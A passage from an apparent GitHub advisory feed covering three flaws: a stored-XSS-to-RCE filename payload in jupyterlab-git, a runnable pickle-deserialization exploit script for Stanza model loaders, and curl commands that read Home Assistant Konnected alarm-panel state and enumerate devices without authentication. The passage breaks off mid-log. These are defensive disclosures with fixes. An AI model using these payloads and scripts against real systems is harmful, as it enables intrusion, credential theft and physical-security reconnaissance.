<p>The issue can be mitigated by replacing innerHTML with textContent for filename rendering in the createHeader() method of PlainTextDiff.ts. Alternatively, proper HTML sanitization (escaping &lt;, &gt;, &amp;, ", ') can be&nbsp;applied before inserting user-controlled filenames into the DOM.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5</a></li>
<li><a href="https://github.com/advisories/GHSA-f962-v9hr-pfg5">https://github.com/advisories/GHSA-f962-v9hr-pfg5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f962-v9hr-pfg5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T19:36:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterlab-git] jupyterlab-git extension: Stored XSS leading to RCE]]></title>
        <id>https://github.com/advisories/GHSA-f962-v9hr-pfg5</id>
        <link href="https://github.com/advisories/GHSA-f962-v9hr-pfg5"/>
        <updated>2026-06-19T19:36:06.000Z</updated>
        <content type="html"><![CDATA[<p>Overview</p>
<p>Amazon Web Services (AWS) Security has identified a stored cross-site scripting (XSS) issue in the jupyterlab-git JupyterLab extension that can lead to remote code execution (RCE). The issue exists in the&nbsp;PlainTextDiff.ts component, where the createHeader() method passes Git filenames directly to innerHTML without sanitization when rendering diffs for renamed files in commit history. This allows an adversary to&nbsp;craft a filename containing arbitrary HTML/JavaScript that executes when another user views the rename diff in the Git History tab.</p>
<p>The issue can be leveraged through the rename history view in the JupyterLab Git panel. An adversary creates a file with a crafted filename containing a JavaScript payload (e.g.,&nbsp;&lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py), renames the file in a subsequent commit, and pushes to a shared repository. When a victim clones the repository, navigates to the Git History tab, clicks the&nbsp;rename commit, and then clicks the renamed file to view the diff, the unsanitized filename renders via innerHTML, executing arbitrary JavaScript in the victim's browser session. The injected JavaScript reads the&nbsp;xsrf cookie, opens a JupyterLab terminal via POST /api/terminals, connects via WebSocket, and executes arbitrary shell commands — achieving full RCE. An adversary can leverage this to exfiltrate secrets or&nbsp;credentials from the victim's environment.</p>
<p>Scope of impact</p>
<p>We discovered this issue during internal security testing. The issue is present in the default configuration of JupyterLab when the jupyterlab-git extension is installed.</p>
<p>The attack requires:</p>
<ul>
<li><p>The adversary to have commit access to a Git repository that the victim has cloned</p>
</li>
<li><p>The victim to navigate to the Git History tab, click the rename commit, and&nbsp;click the renamed file to view the diff</p>
</li>
</ul>
<p>The issue could allow an actor who has access to a shared Git repository to execute arbitrary JavaScript in another user's JupyterLab environment by committing a file with a crafted filename, potentially leading to remote code execution with access to user code, data, environment variables, and credentials.</p>
<p>Proof of concept</p>
<p>The issue exists in the createHeader() method where filenames from rename history are passed directly to innerHTML without sanitization:</p>
<p>[1] <a href="https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214">https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214</a></p>
<p>Attack flow:</p>
<ol>
<li><p>An adversary creates a file with a crafted filename containing a JavaScript payload, e.g., &lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py</p>
</li>
<li><p>The adversary renames the file in a subsequent commit and pushes both commits to a shared Git repository</p>
</li>
<li><p>The victim clones or pulls the repository and navigates to the Git History tab in JupyterLab</p>
</li>
<li><p>The victim clicks the rename commit, then clicks the renamed file to view the diff</p>
</li>
<li><p>The createHeader() method constructs a diff header using string concatenation with the unsanitized filename and assigns the result to innerHTML</p>
</li>
<li><p>The injected JavaScript executes in the victim's browser session, reads the _xsrf cookie, sends a POST request to /api/terminals to open a JupyterLab terminal, connects via WebSocket, and executes arbitrary&nbsp;shell commands</p>
</li>
</ol>
<p>Proof-of-concept mitigation</p>
<p>The issue can be mitigated by replacing innerHTML with textContent for filename rendering in the createHeader() method of PlainTextDiff.ts. Alternatively, proper HTML sanitization (escaping &lt;, &gt;, &amp;, ", ') can be&nbsp;applied before inserting user-controlled filenames into the DOM.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5</a></li>
<li><a href="https://github.com/advisories/GHSA-f962-v9hr-pfg5">https://github.com/advisories/GHSA-f962-v9hr-pfg5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f962-v9hr-pfg5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T19:36:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stanza] Stanza: Remote Code Execution via Unsafe Pickle Deserialization in Model Loaders]]></title>
        <id>https://github.com/advisories/GHSA-v5jw-96jm-7h2c</id>
        <link href="https://github.com/advisories/GHSA-v5jw-96jm-7h2c"/>
        <updated>2026-06-19T19:35:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Stanza 1.12.0 attempts to safely load PyTorch checkpoint files using <code>torch.load(..., weights_only=True)</code>, but automatically falls back to the fully unsafe <code>torch.load(..., weights_only=False)</code> when the safe load raises <code>pickle.UnpicklingError</code>. Because the <code>UnpicklingError</code> condition is fully attacker-controllable, any <code>.pt</code> file that contains a single unsupported pickle global will trigger it.</p>
<p>An attacker who can place a malicious pretrain or model file on disk (via supply-chain compromise, a poisoned model repository, or a shared model cache) can achieve arbitrary code execution on any machine that loads a Stanza NLP pipeline. </p>
<p>Code execution occurs inside the Stanza pretrain-loading API, not merely by calling <code>torch.load</code> directly.</p>
<h3 id="details">Details</h3>
<p>The vulnerable code is in <a href="https://github.com/stanfordnlp/stanza/blob/main/stanza/models/common/pretrain.py#L59-L67">pretrain.py#L59-L67</a> (Stanza 1.12.0):</p>
<pre><code class="language-python">try:
    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=True)
except UnpicklingError:
    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=False)
</code></pre>
<p>When <code>weights_only=True</code> is passed, PyTorch's deserializer raises <code>pickle.UnpicklingError</code> for any object whose class or callable is not on the safe-globals allowlist. This is the intended safety mechanism. However, Stanza catches that exception and immediately reloads the <strong>same attacker-controlled file</strong> with <code>weights_only=False</code>, which invokes Python's full pickle deserializer and executes any <code>__reduce__</code> method in the file without restriction.</p>
<p>The fallback is triggered reliably and intentionally: an attacker embeds one unsupported pickle global (e.g., <code>builtins.open</code>) anywhere in an otherwise structurally valid Stanza pretrain state dict. The safe load rejects it; the unsafe reload runs it.</p>
<p><strong>The same try/except pattern exists in at least five additional loaders in Stanza 1.12.0:</strong></p>
<table>
<thead>
<tr>
<th>File</th>
<th>Lines</th>
</tr>
</thead>
<tbody><tr>
<td><code>stanza/models/common/pretrain.py</code></td>
<td>64–66</td>
</tr>
<tr>
<td><code>stanza/models/coref/model.py</code></td>
<td>251–253, 329–331</td>
</tr>
<tr>
<td><code>stanza/models/classifiers/trainer.py</code></td>
<td>80–82</td>
</tr>
<tr>
<td><code>stanza/models/constituency/base_trainer.py</code></td>
<td>94–96</td>
</tr>
</tbody></table>
<p>Additionally, <code>stanza/models/lemma_classifier/base_model.py:127</code> calls <code>torch.load(filename, lambda storage, loc: storage)</code> with no <code>weights_only</code> argument at all, which defaults to <code>False</code> on any PyTorch &lt; 2.6.</p>
<p>The call chain from the public API to the vulnerable fallback is:</p>
<pre><code>stanza.models.common.foundation_cache.load_pretrain(path)
  → FoundationCache.load_pretrain(path)
    → stanza.models.common.pretrain.Pretrain(filename)
      → Pretrain.emb  (property access triggers load)
        → Pretrain.load()
          → torch.load(..., weights_only=True)   # raises UnpicklingError
          → torch.load(..., weights_only=False)  # executes arbitrary pickle
</code></pre>
<hr>
<h3 id="poc">PoC</h3>
<p><strong>Environment:</strong> Python 3.11, <code>stanza==1.12.0</code>, <code>torch==2.12.0</code></p>
<p><strong>Step 1: Install dependencies:</strong></p>
<pre><code class="language-bash">pip install stanza==1.12.0 torch==2.12.0
</code></pre>
<p><strong>Step 2: Save the following as <code>exploit.py</code>:</strong></p>
<pre><code class="language-python">import os
from pathlib import Path

import torch
import stanza
from stanza.models.common.foundation_cache import FoundationCache, load_pretrain
from stanza.models.common.vocab import VOCAB_PREFIX

SENTINEL = "/tmp/stanza_rce_proof"
MODEL    = "/tmp/stanza_malicious.pt"

class HarmlessPayload:
    """Demonstrates execution; writes a sentinel file."""
    def __init__(self, path):
        self.path = path
    def __reduce__(self):
        return (open, (self.path, "w"))

# Build a structurally valid Stanza pretrain state dict with the payload embedded.
words = VOCAB_PREFIX + ["hello"]
state = {
    "vocab": {
        "lang": "", "idx": 0, "cutoff": 0, "lower": False,
        "_id2unit": words,
        "_unit2id": {w: i for i, w in enumerate(words)},
    },
    "emb": torch.zeros((len(words), 2), dtype=torch.float32),
    "payload": HarmlessPayload(SENTINEL),   # ← the malicious object
}
torch.save(state, MODEL)

# Confirm safe-only load raises UnpicklingError and does NOT create sentinel.
try:
    torch.load(MODEL, lambda s, l: s, weights_only=True)
    print("UNEXPECTED: safe load succeeded (no fallback needed)")
except Exception as e:
    print(f"Control: safe load raised {type(e).__name__} : sentinel exists: {Path(SENTINEL).exists()}")

# Load through the real Stanza API. The fallback fires and the sentinel is created.
cache   = FoundationCache()
pretrain = load_pretrain(MODEL, foundation_cache=cache)

print(f"stanza={stanza.__version__}  torch={torch.__version__}")
print(f"emb_shape={tuple(pretrain.emb.shape)}")
print(f"sentinel_exists={Path(SENTINEL).exists()}")
print("VERDICT: ACTUAL_VULN_REAL_STANZA_PATH" if Path(SENTINEL).exists() else "VERDICT: UNPROVEN")
</code></pre>
<p><strong>Step 3 : Run:</strong></p>
<pre><code class="language-bash">python exploit.py
</code></pre>
<p><strong>Expected output (confirmed):</strong></p>
<pre><code>Control: safe load raised UnpicklingError : sentinel exists: False
stanza=1.12.0  torch=2.12.0
emb_shape=(5, 2)
sentinel_exists=True
VERDICT: ACTUAL_VULN_REAL_STANZA_PATH
</code></pre>
<p>The sentinel is created exclusively by the Stanza pretrain-loading API invoking the unsafe fallback : not by a direct <code>torch.load</code> call in the PoC.</p>
<hr>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability class:</strong> CWE-502 : Deserialization of Untrusted Data</p>
<p><strong>Who is impacted:</strong> Any user, researcher, CI/CD pipeline, or production NLP service that loads a Stanza model pretrain file from a source that is not under the victim's exclusive cryptographic control. Concretely:</p>
<ul>
<li>Developers who run <code>stanza.Pipeline(lang)</code> after downloading models from HuggingFace or GitHub</li>
<li>CI pipelines that automatically refresh Stanza models during builds</li>
<li>Research environments that share pretrain files over shared network storage or model repositories</li>
</ul>
<p><strong>Attack prerequisites:</strong> The attacker must be able to place a malicious <code>.pt</code> pretrain file at a path that Stanza will load. Realistic delivery vectors include:</p>
<ul>
<li>Compromise of a HuggingFace model repository hosting Stanza pretrain weights</li>
<li>Poisoning of a shared model cache directory (NFS, S3, artifact store)</li>
<li>A malicious pretrain file distributed via a third-party fine-tuning hub or research repo</li>
</ul>
<p><strong>What an attacker achieves:</strong> Arbitrary code execution with the full privileges of the process running <code>stanza.Pipeline()</code>, typically a developer workstation, a Jupyter notebook server, or a GPU training node. This allows credential theft (HuggingFace tokens, cloud IAM keys from environment variables), persistent backdoors, data exfiltration, and lateral movement in multi-tenant training infrastructure.</p>
<p><strong>Recommended fix:</strong></p>
<p>Remove the unsafe fallback entirely. If <code>weights_only=True</code> raises <code>UnpicklingError</code>, fail closed:</p>
<pre><code class="language-python">try:
    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=True)
except UnpicklingError as e:
    raise RuntimeError(
        f"Refusing to load legacy pretrain file {self.filename!r} with unsafe "
        "deserialization. Regenerate the file using a trusted Stanza migration tool."
    ) from e
</code></pre>
<p>If legacy NumPy-containing pretrain files must be supported, use PyTorch's <code>add_safe_globals()</code> API to allowlist the specific NumPy dtypes required, rather than disabling all safety checks. Apply the same fix to all six affected loaders listed above.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/stanfordnlp/stanza/security/advisories/GHSA-v5jw-96jm-7h2c">https://github.com/stanfordnlp/stanza/security/advisories/GHSA-v5jw-96jm-7h2c</a></li>
<li><a href="https://github.com/advisories/GHSA-v5jw-96jm-7h2c">https://github.com/advisories/GHSA-v5jw-96jm-7h2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5jw-96jm-7h2c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T19:35:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[homeassistant] Home Assistant: Konnected alarm-panel switch state and zone topology disclosed to unauthenticated actors on the LAN]]></title>
        <id>https://github.com/advisories/GHSA-x84v-g949-293w</id>
        <link href="https://github.com/advisories/GHSA-x84v-g949-293w"/>
        <updated>2026-06-19T19:35:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Konnected integration registers an HTTP endpoint, <code>KonnectedView</code> (<code>homeassistant/components/konnected/__init__.py</code>), that is marked as <strong>not requiring authentication</strong> (<code>requires_auth = False</code>). A comment next to that line says auth is instead handled "via the access token from configuration."</p>
<p>That promise is only half true:</p>
<ul>
<li><strong>Write requests (POST and PUT)</strong> are handled by <code>update_sensor()</code>, which <em>does</em> check the request's <code>Authorization: Bearer &lt;token&gt;</code> header against the integration's stored access tokens (using <code>hmac.compare_digest</code>).</li>
<li><strong>Read requests (GET)</strong> are handled by a separate <code>get()</code> method that has <strong>no authentication check at all.</strong></li>
</ul>
<p>By sending GET requests to <code>/api/konnected/device/{device_id}?zone=N</code>, any unauthenticated client on the LAN can:</p>
<ol>
<li><strong>Enumerate configured Konnected device IDs</strong> — the endpoint returns a clean 404-vs-200 difference that acts as an oracle for which devices exist.</li>
<li><strong>Read switch output states</strong> — the on/off state of every switch output (siren, strobe, and relay outputs of the alarm panel).</li>
<li><strong>Read the panel's zone topology</strong> — how the alarm panel's zones are configured.</li>
<li><strong>Trigger panel connections</strong> — each unauthenticated GET forces one outbound <code>panel.async_connect()</code> call to the Konnected hardware on the LAN.</li>
</ol>
<p>The same URL that correctly rejects unauthenticated POST and PUT requests silently serves unauthenticated GET requests, leaking alarm-panel state and device topology to anyone who can reach Home Assistant's HTTP port (8123 on the LAN by default).</p>
<h3 id="details">Details</h3>
<p>This is the threat-model boundary "unauth to auth" the upstream security policy treats as fileable. The same boundary produced CVE-2026-34205 (<code>Unauthenticated app endpoints exposed to local network via host network mode</code>, CVSS 9.7 CRITICAL, March 2026) and CVE-2023-50715 (<code>User accounts disclosed to unauthenticated actors on the LAN</code>, CVSS 4.2 MODERATE, December 2023). The Konnected gap is structurally identical: a HomeAssistantView with <code>requires_auth = False</code> that returns information about configured devices to anyone who can reach the HTTP port.</p>
<p>Confirmed end-to-end against <code>ghcr.io/home-assistant/home-assistant:2026.5.2</code>. The Proof of Concept section below has seven captures. Step 1 cites the three load-bearing source ranges (view registration, the auth check that only POST/PUT use, the GET handler that omits it). Step 2 is the control: POST and PUT on the same URL return <code>401 unauthorized</code> without a Bearer token, proving the integration does have an auth check, just only on the write methods. Step 3 is the bug: GET on the same URL with no Authorization header returns <code>200 {"zone":"5","state":1}</code> for the siren-output zone, equivalent payload for the strobe and relay-output zones. Step 4 exercises the enumeration oracle: unknown <code>device_id</code> returns a 404 with a distinct message from a known <code>device_id</code> with an unknown zone, which a brute-forcer uses to map the device-ID and zone space. Step 5 captures the connection-amplification side effect by firing 10 unauthenticated GETs and observing 10 <code>panel.async_connect()</code> invocations on the panel side. Step 6 shows that a deliberately wrong <code>Authorization</code> header produces the same response as no header at all, confirming the auth header is not consulted on GET. Step 7 captures the HA startup log line that registers <code>KonnectedView</code>.</p>
<h3 id="threat-model">Threat model</h3>
<p>Home Assistant's HTTP server binds to the LAN at port 8123 by default. A Konnected alarm panel is a wired smart-home hardware product whose primary use case is <em>alarm and security</em>: zones 1-6 typically read door/window/glass-break sensors, switches 5-8 drive siren, strobe, and relay outputs that control the alarm itself or external systems such as garage-door openers, entry chimes, or armed-disable interlocks. The state an attacker reads through this bug is precisely the live status of those outputs and inputs.</p>
<p>The attacker model upstream policy explicitly treats as in-scope is the LAN-adjacent unauthenticated client: a guest who joined the wifi, a neighbor on shared coffee-shop wifi, a malicious device that reached the LAN via a separately compromised IoT product, an attacker who landed via a flat office network, or an attacker who pivoted from a VPN endpoint. None of these positions grant an access token. All of them grant the network reachability the bug requires.</p>
<p>The same endpoint is the receiver for legitimate push updates from the Konnected hardware, which is why <code>requires_auth = False</code> exists in the first place. The intent was to enforce a shared access token on the body. That intent is present in <code>update_sensor()</code> and absent in <code>get()</code>.</p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Alarm-system reconnaissance enabling physical intrusion.</strong> A <code>200 {"zone":"5","state":1}</code> response on the siren zone tells an attacker the siren is firing right now, which means a burglary is in progress and the operator may be away or distracted. A <code>state:0</code> on the same zone says the panel is quiet. The same applies to strobes, armed-disable relays, and any switch the operator wired through Konnected. This is the intelligence a physical attacker explicitly seeks before entering a property.</li>
<li><strong>Topology disclosure.</strong> Probing zones 1 through 12 across a known device_id maps the alarm panel: which zones are sensors, which are switches, which switches are configured for which output. Combined with manufacturer documentation, the topology tells an attacker which physical control points to bypass.</li>
<li><strong>Device ID brute force.</strong> The 404 "Device  not configured" oracle on unknown IDs versus 404 "Switch on zone or pin  not configured" on known IDs with unknown zones, versus 200 with state on full hits, is a clean four-state oracle. Konnected hardware derives <code>device_id</code> from its NIC MAC address; production hardware ships with a small set of manufacturer OUI prefixes. The brute force space is on the order of 2^24, trivially scannable from any LAN host with no rate limit.</li>
<li><strong>Outbound connection amplification.</strong> Line 397 of <code>__init__.py</code> fires <code>hass.async_create_task(panel.async_connect())</code> on every successful GET. An unauth attacker drives N outbound connect attempts toward the (typically LAN-private) Konnected hardware with N unauth GETs, no rate limit, no auth log. A 10-rps sustained scan produces a constant connect storm against the panel hardware that, depending on Konnected firmware, may interfere with legitimate push delivery or cause spurious connect/disconnect cycles visible in the operator's notification stream.</li>
<li><strong>No auth trail.</strong> The GET handler logs nothing at INFO level. An attacker can probe this endpoint at arbitrary depth and leave no record in <code>home-assistant.log</code> unless DEBUG logging is enabled for the integration.</li>
</ul>
<h3 id="affected-code">Affected code</h3>
<p><code>homeassistant/components/konnected/__init__.py:296-301</code>, the view registration. The comment on line 301 is load-bearing for the bug: it says auth happens via the configured access token, but that promise is only kept on the POST/PUT path.</p>
<pre><code class="language-python">class KonnectedView(HomeAssistantView):
    """View creates an endpoint to receive push updates from the device."""

    url = UPDATE_ENDPOINT  # /api/konnected/device/{device_id:[a-zA-Z0-9]+}
    name = "api:konnected"
    requires_auth = False  # Uses access token from configuration
</code></pre>
<p><code>homeassistant/components/konnected/__init__.py:313-335</code>, the auth check that lives inside <code>update_sensor()</code>. POST and PUT call this; GET does not.</p>
<pre><code class="language-python">async def update_sensor(self, request: Request, device_id) -&gt; Response:
    """Process a put or post."""
    hass = request.app[KEY_HASS]
    data = hass.data[DOMAIN]

    auth = request.headers.get(AUTHORIZATION)
    tokens = []
    if hass.data[DOMAIN].get(CONF_ACCESS_TOKEN):
        tokens.extend([hass.data[DOMAIN][CONF_ACCESS_TOKEN]])
    tokens.extend(
        [
            entry.data[CONF_ACCESS_TOKEN]
            for entry in hass.config_entries.async_entries(DOMAIN)
            if entry.data.get(CONF_ACCESS_TOKEN)
        ]
    )
    if auth is None or not next(
        (True for token in tokens if hmac.compare_digest(f"Bearer {token}", auth)),
        False,
    ):
        return self.json_message(
            "unauthorized", status_code=HTTPStatus.UNAUTHORIZED
        )
</code></pre>
<p><code>homeassistant/components/konnected/__init__.py:385-438</code>, the GET handler with no authentication. Note line 397 firing <code>panel.async_connect()</code> before any reachable auth check and before any rate-limit logic.</p>
<pre><code class="language-python">async def get(self, request: Request, device_id) -&gt; Response:
    """Return the current binary state of a switch."""
    hass = request.app[KEY_HASS]
    data = hass.data[DOMAIN]

    if not (device := data[CONF_DEVICES].get(device_id)):
        return self.json_message(
            f"Device {device_id} not configured", status_code=HTTPStatus.NOT_FOUND
        )

    if (panel := device.get("panel")) is not None:
        # connect if we haven't already
        hass.async_create_task(panel.async_connect())

    # Our data model is based on zone ids but we convert from/to pin ids
    # based on whether they are specified in the request
    try:
        zone_num = str(
            request.query.get(CONF_ZONE) or PIN_TO_ZONE[request.query[CONF_PIN]]
        )
        zone = next(
            switch
            for switch in device[CONF_SWITCHES]
            if switch[CONF_ZONE] == zone_num
        )

    except StopIteration:
        zone = None
    except KeyError:
        zone = None
        zone_num = None

    if not zone:
        target = request.query.get(
            CONF_ZONE, request.query.get(CONF_PIN, "unknown")
        )
        return self.json_message(
            f"Switch on zone or pin {target} not configured",
            status_code=HTTPStatus.NOT_FOUND,
        )

    resp = {}
    if request.query.get(CONF_ZONE):
        resp[CONF_ZONE] = zone_num
    elif zone_num:
        resp[CONF_PIN] = ZONE_TO_PIN[zone_num]

    # Make sure entity is setup
    if zone_entity_id := zone.get(ATTR_ENTITY_ID):
        resp["state"] = self.binary_value(
            hass.states.get(zone_entity_id).state,
            zone[CONF_ACTIVATION],
        )
        return self.json(resp)
</code></pre>
<p>The four-state response oracle that powers the brute force:</p>
<table>
<thead>
<tr>
<th>Probe</th>
<th>Response</th>
<th>Status</th>
</tr>
</thead>
<tbody><tr>
<td>Unknown <code>device_id</code></td>
<td><code>{"message":"Device &lt;id&gt; not configured"}</code></td>
<td>404</td>
</tr>
<tr>
<td>Known <code>device_id</code>, no <code>zone</code> or <code>pin</code> parameter</td>
<td><code>{"message":"Switch on zone or pin unknown not configured"}</code></td>
<td>404</td>
</tr>
<tr>
<td>Known <code>device_id</code>, unknown <code>zone</code></td>
<td><code>{"message":"Switch on zone or pin &lt;n&gt; not configured"}</code></td>
<td>404</td>
</tr>
<tr>
<td>Known <code>device_id</code>, known <code>zone</code></td>
<td><code>{"zone":"&lt;n&gt;","state":0|1}</code></td>
<td>200</td>
</tr>
</tbody></table>
<p><code>homeassistant/components/konnected/const.py:45</code>, the URL pattern:</p>
<pre><code class="language-python">ENDPOINT_ROOT = "/api/konnected"
UPDATE_ENDPOINT = ENDPOINT_ROOT + r"/device/{device_id:[a-zA-Z0-9]+}"
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Reproduction environment is a single Docker container of Home Assistant Core 2026.5.2 with a small <code>custom_components/konnected_poc/</code> shim that primes <code>hass.data[konnected]</code> with a representative alarm-panel layout and registers the same <code>KonnectedView</code> class through <code>hass.http.register_view</code>. The shim does not change the bug surface; it is the same class the upstream integration registers at line 248. All seven evidence captures below come from one live run against the container.</p>
<h4 id="environment">Environment</h4>
<pre><code>host: Darwin 25.2.0 arm64
docker: Docker version 29.4.3, build 055a478ea9
ha image: ghcr.io/home-assistant/home-assistant:2026.5.2

konnected source SHA-256 (the file containing the bug):
33e1e56b8fe0c28aa2aee060e214a501c813655297b33272e83c2f2d51adc3b6  /usr/src/homeassistant/homeassistant/components/konnected/__init__.py

konnected_poc shim startup log:
2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setting up konnected_poc
2026-05-18 15:23:50.850 INFO (MainThread) [custom_components.konnected_poc] konnected_poc: registered KonnectedView and primed device aabbccdd1122
2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setup of domain konnected_poc took 0.00 seconds
</code></pre>
<h4 id="step-1-cite-the-three-load-bearing-source-ranges-inside-the-running-container">Step 1: cite the three load-bearing source ranges inside the running container</h4>
<pre><code>$ docker exec ha-konnected-poc sh -c '
    pkg=$(python -c "import homeassistant.components.konnected as m; import os; print(os.path.dirname(m.__file__))")
    sed -n "296,305p" "$pkg/__init__.py"
    sed -n "313,336p" "$pkg/__init__.py"
    sed -n "385,438p" "$pkg/__init__.py"
'

--- view registration, requires_auth = False (line 301) ---
class KonnectedView(HomeAssistantView):
    """View creates an endpoint to receive push updates from the device."""

    url = UPDATE_ENDPOINT
    name = "api:konnected"
    requires_auth = False  # Uses access token from configuration

--- update_sensor() enforces Bearer-token auth via hmac.compare_digest ---
    async def update_sensor(self, request: Request, device_id) -&gt; Response:
        """Process a put or post."""
        hass = request.app[KEY_HASS]
        data = hass.data[DOMAIN]

        auth = request.headers.get(AUTHORIZATION)
        tokens = []
        if hass.data[DOMAIN].get(CONF_ACCESS_TOKEN):
            tokens.extend([hass.data[DOMAIN][CONF_ACCESS_TOKEN]])
        tokens.extend(
            [
                entry.data[CONF_ACCESS_TOKEN]
                for entry in hass.config_entries.async_entries(DOMAIN)
                if entry.data.get(CONF_ACCESS_TOKEN)
            ]
        )
        if auth is None or not next(
            (True for token in tokens if hmac.compare_digest(f"Bearer {token}", auth)),
            False,
        ):
            return self.json_message(
                "unauthorized", status_code=HTTPStatus.UNAUTHORIZED
            )

--- get() handler, no auth check anywhere in the body ---
    async def get(self, request: Request, device_id) -&gt; Response:
        """Return the current binary state of a switch."""
        hass = request.app[KEY_HASS]
        data = hass.data[DOMAIN]

        if not (device := data[CONF_DEVICES].get(device_id)):
            return self.json_message(
                f"Device {device_id} not configured", status_code=HTTPStatus.NOT_FOUND
            )

        if (panel := device.get("panel")) is not None:
            # connect if we haven't already
            hass.async_create_task(panel.async_connect())
        ...
        return self.json(resp)
</code></pre>
<h4 id="step-2-control-post-and-put-on-the-same-url-return-401-without-a-bearer-token">Step 2: control. POST and PUT on the same URL return 401 without a Bearer token</h4>
<p>The integration does enforce a Bearer-token check; the policy is just only applied to the write methods.</p>
<pre><code>$ curl -sS -i -X POST -H "Content-Type: application/json" \
    -d '{"zone":"5","state":"1"}' \
    http://127.0.0.1:8123/api/konnected/device/aabbccdd1122

HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 26

{"message":"unauthorized"}

$ curl -sS -i -X PUT -H "Content-Type: application/json" \
    -d '{"zone":"5","state":"1"}' \
    http://127.0.0.1:8123/api/konnected/device/aabbccdd1122

HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 26

{"message":"unauthorized"}
</code></pre>
<h4 id="step-3-the-bug-get-returns-alarm-panel-switch-state-with-no-authorization-header">Step 3: the bug. GET returns alarm-panel switch state with no Authorization header</h4>
<p>Three zones queried unauthenticated. Each returns the live binary state of a switch output on the configured Konnected alarm panel.</p>
<pre><code>$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"zone":"5","state":1}

$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=6"

HTTP/1.1 200 OK
Content-Length: 22

{"zone":"6","state":1}

$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=7"

HTTP/1.1 200 OK
Content-Length: 22

{"zone":"7","state":1}
</code></pre>
<p>Zone 5 is the siren output of the panel in this configuration. Zone 6 is the strobe. Zone 7 is the relay output wired to the garage arm-disable circuit. The unauthenticated attacker learns each output is currently active.</p>
<h4 id="step-4-enumeration-oracle-three-distinct-response-shapes-power-the-brute-force">Step 4: enumeration oracle. Three distinct response shapes power the brute force</h4>
<pre><code>$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/ffffffffffff?zone=5"

HTTP/1.1 404 Not Found
Content-Length: 48

{"message":"Device ffffffffffff not configured"}

$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=99"

HTTP/1.1 404 Not Found
Content-Length: 53

{"message":"Switch on zone or pin 99 not configured"}

$ curl -sS -i "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"

HTTP/1.1 200 OK
Content-Length: 22

{"zone":"5","state":1}
</code></pre>
<p>An attacker sweeping the <code>device_id</code> space sees the <code>Device &lt;id&gt; not configured</code> message until a real device matches, at which point the <code>Switch on zone or pin &lt;n&gt; not configured</code> message starts appearing. Then a 12-iteration zone sweep maps the panel's full output topology.</p>
<h4 id="step-5-connection-amplification-n-unauth-gets-drive-n-outbound-panelasync_connect-calls">Step 5: connection amplification. N unauth GETs drive N outbound <code>panel.async_connect()</code> calls</h4>
<p>10 unauthenticated GET requests at line rate. The <code>panel.async_connect()</code> invocations logged by the panel-side stub confirm line 397 of <code>__init__.py</code> fires unconditionally on every successful GET, before any reachable rate-limit logic and before any reachable auth check.</p>
<pre><code>$ for i in $(seq 1 10); do
    curl -sS -o /dev/null -w "GET #%{http_code}\n" \
      "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
  done

GET #200
GET #200
GET #200
GET #200
GET #200
GET #200
GET #200
GET #200
GET #200
GET #200

$ docker logs ha-konnected-poc 2&gt;&amp;1 | grep "async_connect() invoked"

2026-05-18 15:23:55.893 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #1). In production this is an outbound HTTPS call to the configured Konnected hardware.
2026-05-18 15:23:55.900 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #2). ...
2026-05-18 15:23:55.907 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #3). ...
2026-05-18 15:23:55.921 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #4). ...
2026-05-18 15:23:55.928 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #5). ...
2026-05-18 15:23:55.937 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #6). ...
